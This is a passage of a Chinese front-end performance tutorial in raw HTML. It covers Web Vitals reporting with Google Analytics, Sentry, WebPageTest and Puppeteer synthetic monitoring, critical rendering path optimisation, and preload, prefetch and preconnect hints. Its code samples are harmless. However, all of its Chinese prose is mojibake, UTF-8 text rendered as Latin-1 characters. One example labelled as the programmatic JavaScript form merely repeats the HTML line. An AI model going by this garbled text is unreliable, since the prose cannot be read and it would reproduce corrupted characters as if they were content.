align="left">æ€§èƒ½æŒ‡æ ‡</td><td align="left">é€šè¿‡ web-vitals åº“é›†æˆ LCP&#x2F;FID&#x2F;CLS ç­‰ Core Web Vitals æŒ‡æ ‡</td></tr><tr><td align="left">ç”¨æˆ·åˆ†ç¾¤</td><td align="left">æŒ‰è®¾å¤‡ã€åœ°åŸŸã€æµé‡æ¥æºç»†åˆ†æ€§èƒ½æ•°æ®ï¼ˆå¦‚â€œç§»åŠ¨ç«¯ç”¨æˆ· LCP &gt; 4s å æ¯”â€ï¼‰</td></tr><tr><td align="left">è½¬åŒ–æ¼æ–—</td><td align="left">å®šä¹‰å¤šæ­¥éª¤ä¸šåŠ¡æµç¨‹ï¼ˆå¦‚æ³¨å†Œæµç¨‹ï¼‰ï¼Œåˆ†æå„ç¯èŠ‚æµå¤±ç‡</td></tr></tbody></table><p>å®æ–½ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é€šè¿‡ gtag.js ä¸ŠæŠ¥ Web Vitals</span><br><span class="hljs-keyword">import</span> &#123;getLCP, getFID, getCLS&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;web-vitals&#x27;</span>;<br><span class="hljs-title function_">getLCP</span>(<span class="hljs-function"><span class="hljs-params">metric</span> =&gt;</span> <span class="hljs-title function_">gtag</span>(<span class="hljs-string">&#x27;event&#x27;</span>, <span class="hljs-string">&#x27;LCP&#x27;</span>, &#123;<span class="hljs-attr">value</span>: metric.<span class="hljs-property">value</span>&#125;));<br></code></pre></td></tr></table></figure><p><strong>Sentry vs Google Analytics å…³é”®å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">Sentry</th><th align="left">Google Analytics</th></tr></thead><tbody><tr><td align="left">æ ¸å¿ƒå®šä½</td><td align="left">é”™è¯¯è¯Šæ–­ä¸æ ¹å› åˆ†æ</td><td align="left">ç”¨æˆ·è¡Œä¸ºåˆ†æä¸æµé‡è½¬åŒ–</td></tr><tr><td align="left">æ€§èƒ½ç›‘æ§æ·±åº¦</td><td align="left">æ”¯æŒä»£ç çº§é”™è¯¯å®šä½ + æ€§èƒ½é“¾è·¯è¿½è¸ª</td><td align="left">ä»…æä¾›èšåˆæŒ‡æ ‡ï¼ˆæ— å †æ ˆè·Ÿè¸ªï¼‰</td></tr><tr><td align="left">è‡ªå®šä¹‰æ‰©å±•</td><td align="left">æ”¯æŒè‡ªå®šä¹‰æ ‡ç­¾ã€äº‹ä»¶ã€é‡‡æ ·ç­–ç•¥</td><td align="left">ä¾èµ– gtag äº‹ä»¶APIï¼Œçµæ´»æ€§è¾ƒä½</td></tr><tr><td align="left">æ•°æ®å®æ—¶æ€§</td><td align="left">é”™è¯¯æŠ¥è­¦åˆ†é’Ÿçº§æ¨é€</td><td align="left">æ•°æ®å»¶è¿Ÿ 24-48 å°æ—¶</td></tr><tr><td align="left">æˆæœ¬æ¨¡å‹</td><td align="left">æŒ‰äº‹ä»¶é‡æ”¶è´¹ï¼ˆå…è´¹ç‰ˆæœ‰é™é¢ï¼‰</td><td align="left">å®Œå…¨å…è´¹ï¼ˆGA4 æ ‡å‡†ç‰ˆï¼‰</td></tr><tr><td align="left">é›†æˆç”Ÿæ€</td><td align="left">æ”¯æŒ Jira&#x2F;Slack ç­‰ DevOps å·¥å…·é“¾</td><td align="left">ä¸»è¦ä¸ Google ç”Ÿæ€ï¼ˆAds&#x2F; BigQueryï¼‰é›†æˆ</td></tr></tbody></table><h3 id="Synthetic-Monitoring-åˆæˆç›‘æ§-ï¼šWebPageTest-Puppeteer"><a href="#Synthetic-Monitoring-åˆæˆç›‘æ§-ï¼šWebPageTest-Puppeteer" class="headerlink" title="Synthetic Monitoring (åˆæˆç›‘æ§)ï¼šWebPageTest &#x2F; Puppeteer"></a>Synthetic Monitoring (åˆæˆç›‘æ§)ï¼šWebPageTest &#x2F; Puppeteer</h3><p><strong>åˆæˆç›‘æ§æ ¸å¿ƒæ¦‚å¿µ</strong></p><ul><li>å®šä¹‰ä¸ä»·å€¼<ul><li>åœ¨é¢„è®¾ç¯å¢ƒä¸­é€šè¿‡è„šæœ¬æ¨¡æ‹Ÿç”¨æˆ·æ“ä½œè·¯å¾„ï¼ˆå¦‚é¡µé¢å¯¼èˆªã€ç‚¹å‡»ï¼‰</li><li>ä¸ RUM äº’è¡¥ï¼šæä¾›ç¨³å®šå¯å¤ç°çš„åŸºå‡†æµ‹è¯•ï¼Œæ’é™¤ç”¨æˆ·è®¾å¤‡&#x2F;ç½‘ç»œå·®å¼‚</li></ul></li><li>æ ¸å¿ƒåº”ç”¨åœºæ™¯<ul><li>ç‰ˆæœ¬å‘å¸ƒå‰æ€§èƒ½å›å½’æµ‹è¯•</li><li>ç«å“æ€§èƒ½å¯¹æ ‡åˆ†æ</li><li>CDN èŠ‚ç‚¹é€‰æ‹©ä¼˜åŒ–ï¼ˆå…¨çƒå¤šåœ°ç‚¹æµ‹è¯•ï¼‰</li></ul></li></ul><p><strong>WebPageTestï¼šäº‘ç«¯è‡ªåŠ¨åŒ–æµ‹è¯•å¹³å°</strong></p><p>æ ¸å¿ƒåŠŸèƒ½è§£æï¼š</p><table><thead><tr><th align="left">åŠŸèƒ½ç»´åº¦</th><th align="left">æŠ€æœ¯å®ç°</th></tr></thead><tbody><tr><td align="left">å¤šåœ°ç‚¹æµ‹è¯•</td><td align="left">æ”¯æŒå…¨çƒ 40+ æµ‹è¯•èŠ‚ç‚¹ï¼ˆAWS EC2 å®ä¾‹ï¼‰</td></tr><tr><td align="left">ç½‘ç»œæ¨¡æ‹Ÿ</td><td align="left">è‡ªå®šä¹‰å¸¦å®½&#x2F;å»¶è¿Ÿï¼ˆDSL&#x2F;Cable&#x2F;4Gï¼‰æˆ–ç²¾ç¡®ä¸¢åŒ…ç‡è®¾ç½®</td></tr><tr><td align="left">é«˜çº§æ•è·</td><td align="left">è§†é¢‘å½•åˆ¶ã€Traceroute è¯Šæ–­ã€HTTP&#x2F;2 ä¼˜å…ˆçº§å¯è§†åŒ–</td></tr><tr><td align="left">è„šæœ¬æ‰©å±•</td><td align="left">é€šè¿‡ navigate&#x2F;clickAndWait ç­‰å‘½ä»¤æ¨¡æ‹Ÿç”¨æˆ·æµï¼ˆæ”¯æŒç™»å½•ç­‰å¤æ‚æ“ä½œï¼‰</td></tr></tbody></table><p>å…³é”®æµ‹è¯•æŒ‡æ ‡ï¼š</p><pre class="mermaid">graph LRA[WebPageTestæŠ¥å‘Š] --> B[æ ¸å¿ƒæ€§èƒ½æŒ‡æ ‡]A --> C[èµ„æºç€‘å¸ƒæµ]A --> D[ä¼˜åŒ–å»ºè®®]B --> B1(LCP)B --> B2(TTFB)B --> B3(Speed Index)C --> C1(èµ„æºåŠ è½½æ—¶åº)C --> C2(CDNå‘½ä¸­çŠ¶æ€)D --> D1(å‹ç¼©å»ºè®®)D --> D2(ç¼“å­˜ç­–ç•¥)</pre><p><strong>å®æˆ˜å·¥ä½œæµ</strong></p><p>(1) æµ‹è¯•é…ç½®</p><ul><li>é€‰æ‹©æµ‹è¯•åœ°ç‚¹ï¼ˆå¦‚ ec2-us-east-1ï¼‰</li><li>è®¾ç½®ç½‘ç»œèŠ‚æµï¼ˆå¦‚ 4G: 20ms RTT, 20Mbpsï¼‰</li><li>æ·»åŠ è‡ªå®šä¹‰è„šæœ¬ï¼š</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Text">navigate https://example.com<br>execAndWait document.querySelector(&#x27;#login&#x27;).click()<br>setValue input[name=user] test@email.com<br>setValue input[name=pass] 123456<br>submitForm id=login-form<br></code></pre></td></tr></table></figure><p>(2) æŠ¥å‘Šè§£è¯»æŠ€å·§</p><ul><li>Speed Index &lt; 3.5s ä¸ºè‰¯å¥½ï¼ˆåæ˜ è§†è§‰å®Œæˆé€Ÿåº¦ï¼‰</li><li>Waterfall çº¢è‰²ç«–çº¿æ ‡è®° DOMContentLoaded æ—¶é—´ç‚¹</li><li>Connection View è¯Šæ–­ HTTP&#x2F;2 å¤šè·¯å¤ç”¨æ•ˆæœ</li></ul><p><strong>Puppeteerï¼šä»£ç çº§ç²¾å‡†æ§åˆ¶æ–¹æ¡ˆ</strong></p><p>æ ¸å¿ƒåŠŸèƒ½è§£æï¼š</p><table><thead><tr><th align="left">èƒ½åŠ›ç±»åˆ«</th><th align="left">API ç¤ºä¾‹</th><th align="left">ç›‘æ§ç”¨é€”</th></tr></thead><tbody><tr><td align="left">æµè§ˆå™¨æ§åˆ¶</td><td align="left">puppeteer.launch()</td><td align="left">å¤šç¯å¢ƒæµ‹è¯•ï¼ˆHeadless&#x2F;Headfulï¼‰</td></tr><tr><td align="left">ç”¨æˆ·è¡Œä¸ºæ¨¡æ‹Ÿ</td><td align="left">page.click(â€˜#buttonâ€™)</td><td align="left">äº¤äº’æ€§èƒ½åˆ†æ</td></tr><tr><td align="left">æ€§èƒ½æ•°æ®æ•è·</td><td align="left">page.metrics()</td><td align="left">è·å– JS å †å¤§å°&#x2F;èŠ‚ç‚¹æ•°ç­‰è¿è¡Œæ—¶æŒ‡æ ‡</td></tr><tr><td align="left">ç½‘ç»œæ‹¦æˆª</td><td align="left">page.setRequestInterception(true)</td><td align="left">æ¨¡æ‹Ÿ API å¤±è´¥&#x2F;å»¶è¿Ÿ</td></tr></tbody></table><p>åˆæˆç›‘æ§å®ç°æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;puppeteer&#x27;</span>);<br><br>(<span class="hljs-title function_">async</span> () =&gt; &#123;<br>  <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">launch</span>();<br>  <span class="hljs-keyword">const</span> page = <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">newPage</span>();<br>  <br>  <span class="hljs-comment">// å¯åŠ¨æ€§èƒ½è·Ÿè¸ª</span><br>  <span class="hljs-keyword">await</span> page.<span class="hljs-property">tracing</span>.<span class="hljs-title function_">start</span>(&#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;trace.json&#x27;</span> &#125;);<br>  <br>  <span class="hljs-comment">// æ¨¡æ‹Ÿç”¨æˆ·æµ</span><br>  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">&#x27;https://example.com&#x27;</span>, &#123; <span class="hljs-attr">waitUntil</span>: <span class="hljs-string">&#x27;networkidle2&#x27;</span> &#125;);<br>  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;#search&#x27;</span>, <span class="hljs-string">&#x27;performance&#x27;</span>);<br>  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">click</span>(<span class="hljs-string">&#x27;#submit&#x27;</span>);<br>  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">waitForSelector</span>(<span class="hljs-string">&#x27;.results&#x27;</span>);<br>  <br>  <span class="hljs-comment">// åœæ­¢è·Ÿè¸ªå¹¶è¾“å‡ºæŒ‡æ ‡</span><br>  <span class="hljs-keyword">await</span> page.<span class="hljs-property">tracing</span>.<span class="hljs-title function_">stop</span>();<br>  <span class="hljs-keyword">const</span> perfMetrics = <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">metrics</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;JSHeapUsedSize:&#x27;</span>, perfMetrics.<span class="hljs-property">JSHeapUsedSize</span>);<br>  <br>  <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>();<br>&#125;)();<br></code></pre></td></tr></table></figure><p><strong>WebPageTest vs Puppeteer å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">WebPageTest</th><th align="left">Puppeteer</th></tr></thead><tbody><tr><td align="left">éƒ¨ç½²æ¨¡å¼</td><td align="left">äº‘ç«¯ SaaS</td><td align="left">æœ¬åœ° Node.js ç¯å¢ƒ</td></tr><tr><td align="left">æ‰©å±•æ€§</td><td align="left">å—é™ï¼ˆä»…æ”¯æŒå†…ç½®å‘½ä»¤ï¼‰</td><td align="left">æ— é™ï¼ˆå¯ç¼–ç¨‹æ§åˆ¶ï¼‰</td></tr><tr><td align="left">æŠ¥å‘Šæ·±åº¦</td><td align="left">å¼€ç®±å³ç”¨ï¼ˆå«è§†é¢‘&#x2F;ç€‘å¸ƒæµï¼‰</td><td align="left">éœ€è‡ªè¡Œå®ç°æ•°æ®å¯è§†åŒ–</td></tr><tr><td align="left">æˆæœ¬</td><td align="left">å…è´¹ç‰ˆæœ‰é™é¢ï¼Œä¼ä¸šç‰ˆä»˜è´¹</td><td align="left">å¼€æºå…è´¹ï¼Œéœ€è‡ªå»ºåŸºç¡€è®¾æ–½</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">å¿«é€Ÿè·å–å¤šåœ°ç‚¹æµ‹è¯•æŠ¥å‘Š</td><td align="left">CI&#x2F;CD æµæ°´çº¿é›†æˆã€å¤æ‚åœºæ™¯ç²¾å‡†æµ‹è¯•</td></tr></tbody></table><h1 id="äºŒã€ç½‘ç»œå±‚ä¼˜åŒ–"><a href="#äºŒã€ç½‘ç»œå±‚ä¼˜åŒ–" class="headerlink" title="äºŒã€ç½‘ç»œå±‚ä¼˜åŒ–"></a>äºŒã€ç½‘ç»œå±‚ä¼˜åŒ–</h1><h2 id="2-1-èµ„æºåŠ è½½ç­–ç•¥"><a href="#2-1-èµ„æºåŠ è½½ç­–ç•¥" class="headerlink" title="2.1 èµ„æºåŠ è½½ç­–ç•¥"></a>2.1 èµ„æºåŠ è½½ç­–ç•¥</h2><h3 id="å…³é”®æ¸²æŸ“è·¯å¾„ä¼˜åŒ–ï¼ˆCritical-Rendering-Pathï¼‰"><a href="#å…³é”®æ¸²æŸ“è·¯å¾„ä¼˜åŒ–ï¼ˆCritical-Rendering-Pathï¼‰" class="headerlink" title="å…³é”®æ¸²æŸ“è·¯å¾„ä¼˜åŒ–ï¼ˆCritical Rendering Pathï¼‰"></a>å…³é”®æ¸²æŸ“è·¯å¾„ä¼˜åŒ–ï¼ˆCritical Rendering Pathï¼‰</h3><p><strong>å…³é”®æ¸²æŸ“è·¯å¾„ï¼ˆCRPï¼‰æ ¸å¿ƒæ¦‚å¿µ</strong></p><ul><li>å®šä¹‰<ul><li>æµè§ˆå™¨å°† HTML&#x2F;CSS&#x2F;JS è½¬æ¢ä¸ºå¯è§†åƒç´ çš„å®Œæ•´å¤„ç†é“¾æ¡</li><li>ä»æ¥æ”¶å­—èŠ‚æµåˆ°æ¸²æŸ“é¦–å±å†…å®¹çš„å…³é”®æ­¥éª¤åºåˆ—</li></ul></li><li>ä¼˜åŒ–ç›®æ ‡<ul><li>æœ€å°åŒ– é¦–æ¬¡å†…å®¹ç»˜åˆ¶æ—¶é—´ï¼ˆFCPï¼‰</li><li>ç¼©çŸ­ é¦–æ¬¡æœ‰æ•ˆæ¸²æŸ“æ—¶é—´ï¼ˆFirst Meaningful Paintï¼‰</li></ul></li></ul><p><strong>CRP æ ¸å¿ƒå¤„ç†é˜¶æ®µ</strong></p><pre class="mermaid">graph TDA[ä¸‹è½½HTML] --> B[æ„å»ºDOMæ ‘]A --> C[ä¸‹è½½CSSæ„å»ºCSSOMæ ‘]B & C --> D[åˆå¹¶ç”Ÿæˆæ¸²æŸ“æ ‘]D --> E[å¸ƒå±€è®¡ç®—]E --> F[åƒç´ ç»˜åˆ¶]</pre><p><strong>é˜¶æ®µè¯¦è§£</strong></p><ul><li>DOM æ„å»ºï¼ˆParse HTMLï¼‰<ul><li>è¾¹ä¸‹è½½è¾¹è§£æï¼Œé‡ <code>&lt;script&gt;</code> ä¼šé˜»å¡è§£æï¼ˆé™¤é async&#x2F;deferï¼‰</li><li>é‡ <code>&lt;link rel=&quot;stylesheet&quot;&gt;</code> ä¸é˜»å¡ DOM è§£æä½†é˜»å¡æ¸²æŸ“</li></ul></li><li>CSSOM æ„å»º<ul><li>å®Œå…¨æ¸²æŸ“é˜»å¡ï¼šæµè§ˆå™¨éœ€å®Œæ•´ CSSOM æ‰èƒ½æ¸²æŸ“é¡µé¢</li><li>ç‰¹æ€§ï¼šå±‚å è§„åˆ™å¯¼è‡´ CSS è§£æä¸å¯å¢é‡ï¼ˆåº•éƒ¨æ ·å¼å¯è¦†ç›–é¡¶éƒ¨ï¼‰</li></ul></li><li>æ¸²æŸ“æ ‘ï¼ˆRender Treeï¼‰:åˆå¹¶ DOM + CSSOMï¼Œæ’é™¤ä¸å¯è§å…ƒç´ ï¼ˆå¦‚ display:noneï¼‰</li><li>å¸ƒå±€ï¼ˆLayout&#x2F;Reflowï¼‰:è®¡ç®—æ‰€æœ‰å…ƒç´ çš„å‡ ä½•ä½ç½®ï¼ˆè§†å£å°ºå¯¸å½±å“ç»“æœï¼‰<br>*ç»˜åˆ¶ï¼ˆPaintï¼‰:å°†å¸ƒå±€ç»“æœè½¬ä¸ºå±å¹•åƒç´ ï¼ˆå¯èƒ½åˆ†å¤šå±‚ç»˜åˆ¶ï¼‰</li></ul><p><strong>é˜»å¡è¡Œä¸ºæ·±åº¦è§£æ</strong></p><table><thead><tr><th align="left">èµ„æºç±»å‹</th><th align="left">DOM æ„å»º</th><th align="left">æ¸²æŸ“é˜»å¡</th><th align="left">ä¼˜åŒ–ç­–ç•¥</th></tr></thead><tbody><tr><td align="left">åŒæ­¥ <code>&lt;script&gt;</code></td><td align="left">é˜»å¡</td><td align="left">é˜»å¡</td><td align="left">async&#x2F;defer</td></tr><tr><td align="left">å¤–éƒ¨ CSS</td><td align="left">ä¸é˜»å¡</td><td align="left">é˜»å¡</td><td align="left">å†…è”å…³é”®CSS</td></tr><tr><td align="left">åª’ä½“æŸ¥è¯¢ CSS</td><td align="left">ä¸é˜»å¡</td><td align="left">æ¡ä»¶é˜»å¡</td><td align="left">æ‹†åˆ†éå…³é”®CSS</td></tr><tr><td align="left"><code>&lt;img&gt;</code></td><td align="left">ä¸é˜»å¡</td><td align="left">ä¸é˜»å¡</td><td align="left">æ‡’åŠ è½½</td></tr><tr><td align="left">å¼‚æ­¥ <code>&lt;script&gt;</code></td><td align="left">ä¸é˜»å¡</td><td align="left">ä¸é˜»å¡</td><td align="left">é¢„åŠ è½½</td></tr></tbody></table><p><strong>CRP ä¼˜åŒ–äº”å¤§ç­–ç•¥</strong></p><p>(1) æœ€å°åŒ–å…³é”®èµ„æºæ•°é‡</p><ul><li>ç§»é™¤éé¦–å±å¿…éœ€ JS&#x2F;CSSï¼ˆå¦‚åˆ†æè„šæœ¬å»¶è¿ŸåŠ è½½ï¼‰</li></ul><p>(2) å‹ç¼©å…³é”®èµ„æºä½“ç§¯</p><ul><li>æé™å‹ç¼© CSS&#x2F;JSï¼ˆTerser + CSSNanoï¼‰</li><li>å†…è”æ ¸å¿ƒ CSSï¼ˆæ§åˆ¶åœ¨ 14KB ä»¥å†…ä»¥åˆ©ç”¨ TCP æ…¢å¯åŠ¨ï¼‰</li></ul><p>(3) ç¼©çŸ­å…³é”®è·¯å¾„é•¿åº¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- éå…³é”®CSSå¼‚æ­¥åŠ è½½ --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;non-critical.css&quot; as=&quot;style&quot; onload=&quot;this.rel=&#x27;stylesheet&#x27;&quot;&gt;<br>&lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;non-critical.css&quot;&gt;&lt;/noscript&gt;<br></code></pre></td></tr></table></figure><p>(4) ä¼˜åŒ– JavaScript åŠ è½½ä¼˜å…ˆçº§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- é¦–å±å¿…éœ€è„šæœ¬ï¼šæ·»åŠ  preload --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;critical.js&quot; as=&quot;script&quot;&gt;<br><br>&lt;!-- éå¿…éœ€è„šæœ¬ï¼šå»¶è¿Ÿæ‰§è¡Œ --&gt;<br>&lt;script src=&quot;analytics.js&quot; defer&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>(5) å¹¶è¡ŒåŒ–èµ„æºåŠ è½½</p><ul><li>ä½¿ç”¨ HTTP&#x2F;2 å¤šè·¯å¤ç”¨é¿å…é˜Ÿå¤´é˜»å¡</li><li>é¢„å»ºç«‹è¿æ¥ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;link rel=&quot;preconnect&quot; href=&quot;https://cdn.example.com&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>CRP ä¼˜åŒ–æ£€æŸ¥æ¸…å•</strong></p><ol><li>é¦–å±å†…å®¹æ‰€éœ€ CSS å†…è”åˆ° <code>&lt;style&gt;</code> æ ‡ç­¾</li><li>éå…³é”® CSS å¼‚æ­¥åŠ è½½ï¼ˆpreload + onloadï¼‰</li><li>æ‰€æœ‰ <code>&lt;script&gt;</code> æ·»åŠ  async æˆ– defer</li><li>å›¾ç‰‡&#x2F;å­—ä½“ä½¿ç”¨ preload æå‰è·å–</li><li>é…ç½® HTTP&#x2F;2 æœåŠ¡ç«¯æ¨é€å…³é”®èµ„æº</li><li>ä½¿ç”¨éª¨æ¶å±å ä½é¿å…å¸ƒå±€åç§»ï¼ˆCLSï¼‰</li></ol><h3 id="èµ„æºä¼˜å…ˆçº§ï¼špreload-prefetch-preconnect"><a href="#èµ„æºä¼˜å…ˆçº§ï¼špreload-prefetch-preconnect" class="headerlink" title="èµ„æºä¼˜å…ˆçº§ï¼špreload, prefetch, preconnect"></a>èµ„æºä¼˜å…ˆçº§ï¼špreload, prefetch, preconnect</h3><p><strong>æ ¸å¿ƒæœºåˆ¶å¯¹æ¯”</strong></p><table><thead><tr><th align="left">æŒ‡ä»¤</th><th align="left">åŠ è½½ä¼˜å…ˆçº§</th><th align="left">é€‚ç”¨åœºæ™¯</th><th align="left">æµè§ˆå™¨æ”¯æŒ</th><th align="left">å…¸å‹ç”Ÿå‘½å‘¨æœŸ</th></tr></thead><tbody><tr><td align="left">preload</td><td align="left">æœ€é«˜ï¼ˆç«‹å³åŠ è½½ï¼‰</td><td align="left">å½“å‰è·¯ç”±å…³é”®èµ„æºï¼ˆå­—ä½“&#x2F;é¦–å›¾ï¼‰</td><td align="left">93% (2023)</td><td align="left">å½“å‰é¡µé¢</td></tr><tr><td align="left">prefetch</td><td align="left">æœ€ä½ï¼ˆç©ºé—²åŠ è½½ï¼‰</td><td align="left">ä¸‹ä¸ªè·¯ç”±å¯èƒ½ç”¨åˆ°çš„èµ„æº</td><td align="left">92%</td><td align="left">è·¨é¡µé¢ç¼“å­˜</td></tr><tr><td align="left">preconnect</td><td align="left">è¿æ¥ä¼˜å…ˆ</td><td align="left">é«˜é¢‘ç¬¬ä¸‰æ–¹æºï¼ˆCDN&#x2F;APIï¼‰</td><td align="left">96%</td><td align="left">è¿æ¥ä¿æŒ10s</td></tr></tbody></table><p><strong>preload æ·±åº¦è§£æ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- åŸºæœ¬ç”¨æ³• --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;font.woff2&quot; as=&quot;font&quot; type=&quot;font/woff2&quot; crossorigin&gt;<br><br>&lt;!-- åª’ä½“æŸ¥è¯¢æ‰©å±• --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;desktop.css&quot; as=&quot;style&quot; media=&quot;(min-width: 1024px)&quot;&gt;<br></code></pre></td></tr></table></figure><p>æ ¸å¿ƒåŠŸèƒ½ï¼š</p><ul><li>å¼ºåˆ¶æµè§ˆå™¨æå‰è¯·æ±‚ï¼šæ— è§†é»˜è®¤èµ„æºå‘ç°é¡ºåº</li><li>as å±æ€§å¿…å¡«ï¼šå£°æ˜èµ„æºç±»å‹ï¼ˆfont&#x2F;image&#x2F;script&#x2F;styleï¼‰<ul><li>é”™è¯¯ç±»å‹å°†å¯¼è‡´é‡å¤ä¸‹è½½ï¼ˆå¦‚ as&#x3D;â€styleâ€ å®é™…æ˜¯JSï¼‰</li></ul></li><li>è·¨åŸŸè¦æ±‚ï¼šå­—ä½“æ–‡ä»¶éœ€åŠ  crossorigin å±æ€§</li></ul><p>æœ€ä½³å®è·µåœºæ™¯ï¼š</p><ul><li>é¦–å±å…³é”®å­—ä½“ï¼šé˜²æ­¢FOITï¼ˆå­—ä½“æœªåŠ è½½æ—¶ä¸å¯è§æ–‡æœ¬ï¼‰</li><li>é¦–å±å¤§å›¾ï¼šé…åˆ as&#x3D;â€imageâ€ æå‡LCPå…ƒç´ åŠ è½½ä¼˜å…ˆçº§</li><li>å…³é”®è„šæœ¬ï¼šä¼˜å…ˆåŠ è½½å½±å“FCPçš„JSï¼ˆå¦‚æ¡†æ¶è¿è¡Œæ—¶ï¼‰</li></ul><p>ä½¿ç”¨é™·é˜±ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- åä¾‹ï¼šæœªè®¾ç½®aså±æ€§ --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;critical.js&quot;&gt; âŒ è§¦å‘äºŒæ¬¡ä¸‹è½½<br><br>&lt;!-- åä¾‹ï¼šé¢„åŠ è½½éå…³é”®èµ„æº --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;background.jpg&quot;&gt; âŒ æµªè´¹å¸¦å®½<br></code></pre></td></tr></table></figure><p><strong>prefetch åº”ç”¨ç­–ç•¥</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- HTML å£°æ˜å¼ --&gt;<br>&lt;link rel=&quot;prefetch&quot; href=&quot;product-list.js&quot; as=&quot;script&quot;&gt;<br><br>&lt;!-- JS ç¼–ç¨‹å¼ --&gt;<br>&lt;link rel=&quot;prefetch&quot; href=&quot;product-list.js&quot; as=&quot;script&quot;&gt;<br></code></pre></td></tr></table></figure><p>å®ç°æ–¹å¼ï¼š</p><ul><li>ä½ä¼˜å…ˆçº§åŠ è½½ï¼šä»…åœ¨æµè§ˆå™¨ç©ºé—²æ—¶è¯·æ±‚</li><li>HTTP ç¼“å­˜ï¼šèµ„æºå­˜å‚¨åœ¨ disk-cacheï¼Œæœ‰æ•ˆæœŸç”± Cache-Control æ§åˆ¶</li></ul><p>å…¸å‹åœºæ™¯ï¼š</p><p>(1) è·¯ç”±çº§ä»£ç åˆ†å‰²ï¼šé¢„å–ä¸‹ä¸ªé¡µé¢çš„JSæ¨¡å—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React è·¯ç”±é¢„å–ç¤ºä¾‹</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackPrefetch: true */</span> <span class="hljs-string">&#x27;./ProductPage&#x27;</span>)<br></code></pre></td></tr></table></figure><p>(2) æ•°æ®é¢„å–ï¼šæå‰è·å–ç”¨æˆ·å¯èƒ½è®¿é—®çš„APIæ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;link rel=&quot;prefetch&quot; href=&quot;/api/recommendations&quot; as=&quot;fetch&quot;&gt;<br></code></pre></td></tr></table></figure><p>æ€§èƒ½æƒè¡¡ï¼š</p><ul><li>âœ… å¸¦å®½å……è¶³æ—¶å‡å°‘åç»­é¡µé¢åŠ è½½æ—¶é—´ï¼ˆæå‡å¯¼èˆªé€Ÿåº¦30-50%ï¼‰</li><li>âŒ å¼±ç½‘ç¯å¢ƒå¯èƒ½æŠ¢å å…³é”®èµ„æºå¸¦å®½</li></ul><p><strong>preconnect æŠ€æœ¯ç»†èŠ‚</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 